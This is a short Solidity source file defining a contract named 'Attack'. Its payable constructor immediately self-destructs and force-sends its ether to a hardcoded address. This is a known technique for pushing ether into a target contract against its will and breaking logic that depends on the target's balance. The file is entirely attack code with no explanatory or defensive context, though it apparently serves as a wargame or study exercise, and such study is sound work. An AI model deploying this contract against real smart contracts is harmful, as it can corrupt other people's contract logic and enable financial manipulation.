// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Attack{

    constructor() public payable{

        selfdestruct(payable(0x12F9DaDdf4F15376f652351ab05f7117E5c9a1A0));
    }
}